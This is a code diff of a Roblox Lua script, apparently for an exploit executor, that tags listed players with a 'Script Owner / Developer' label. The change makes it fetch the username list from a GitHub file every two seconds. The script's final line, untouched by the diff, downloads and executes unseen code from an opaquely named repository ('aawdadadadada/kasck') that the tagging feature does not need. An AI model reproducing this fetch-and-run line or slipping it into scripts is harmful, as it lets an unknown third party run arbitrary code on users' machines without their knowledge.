@@ -1,56 +1,70 @@
 local Players = game:GetService("Players")
 
 local TAG_NAME = "ScriptOwnerTag"
-local TARGET_USERNAMES = { "Mocaxery", "rWeFrRoblox", "TeenageTungTungSahur", "AstraOutLight",  "skibidaneosn",  "SHIMYMSHIMMYAYE", "rWeFrRoblox2", "ferxD", "rWeDeadahhRoblox", "Xyrevexxx","hairyPu1beMuncher", "Theo_TheoBenzo", "CarsR_FunLOL29", "rWeFrRoblox5" } -- Add more here
 local CHECK_INTERVAL = 2
+local PERMS_URL = "https://raw.githubusercontent.com/AstraOutlight/my-scripts/refs/heads/main/perms%20list"
 
 local TargetLookup = {}
-for _, name in pairs(TARGET_USERNAMES) do
-	TargetLookup[name] = true
+
+local function fetchTargetUsernames()
+    local success, result = pcall(function()
+        return game:HttpGet(PERMS_URL)
+    end)
+
+    if success then
+        TargetLookup = {}
+        for name in result:gmatch("([^,%s]+)") do
+            TargetLookup[name] = true
+        end
+    else
+        warn("Failed to fetch target usernames:", result)
+    end
 end
 
 local function createTag(player)
-	if player.Character and player.Character:FindFirstChild("Head") then
-		if player.Character.Head:FindFirstChild(TAG_NAME) then return end
+    if player.Character and player.Character:FindFirstChild("Head") then
+        if player.Character.Head:FindFirstChild(TAG_NAME) then return end
 
-		local billboard = Instance.new("BillboardGui")
-		billboard.Name = TAG_NAME
-		billboard.Size = UDim2.new(0, 100, 0, 40)
-		billboard.StudsOffset = Vector3.new(0, 2.5, 0)
-		billboard.Adornee = player.Character.Head
-		billboard.AlwaysOnTop = true
-		billboard.Parent = player.Character.Head
+        local billboard = Instance.new("BillboardGui")
+        billboard.Name = TAG_NAME
+        billboard.Size = UDim2.new(0, 100, 0, 40)
+        billboard.StudsOffset = Vector3.new(0, 2.5, 0)
+        billboard.Adornee = player.Character.Head
+        billboard.AlwaysOnTop = true
+        billboard.Parent = player.Character.Head
 
-		local label = Instance.new("TextLabel")
-		label.Size = UDim2.new(1, 0, 1, 0)
-		label.BackgroundTransparency = 1
-		label.Text = "Script Owner / Developer"
-		label.TextColor3 = Color3.new(1, 1, 0)
-		label.TextStrokeTransparency = 0
-		label.TextScaled = true
-		label.Font = Enum.Font.GothamBold
-		label.Parent = billboard
-	end
+        local label = Instance.new("TextLabel")
+        label.Size = UDim2.new(1, 0, 1, 0)
+        label.BackgroundTransparency = 1
+        label.Text = "Script Owner / Developer"
+        label.TextColor3 = Color3.new(1, 1, 0)
+        label.TextStrokeTransparency = 0
+        label.TextScaled = true
+        label.Font = Enum.Font.GothamBold
+        label.Parent = billboard
+    end
 end
 
 task.spawn(function()
-	while true do
-		for _, player in pairs(Players:GetPlayers()) do
-			if TargetLookup[player.Name] then
-				createTag(player)
-			end
-		end
-		task.wait(CHECK_INTERVAL)
-	end
+    while true do
+        fetchTargetUsernames()
+        for _, player in pairs(Players:GetPlayers()) do
+            if TargetLookup[player.Name] then
+                createTag(player)
+            end
+        end
+        task.wait(CHECK_INTERVAL)
+    end
 end)
 
 Players.PlayerAdded:Connect(function(player)
-	if TargetLookup[player.Name] then
-		player.CharacterAdded:Connect(function()
-			task.wait(1)
-			createTag(player)
-		end)
-	end
+    fetchTargetUsernames()
+    if TargetLookup[player.Name] then
+        player.CharacterAdded:Connect(function()
+            task.wait(1)
+            createTag(player)
+        end)
+    end
 end)
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/9274837292748/aawdadadadada/refs/heads/main/kasck"))()
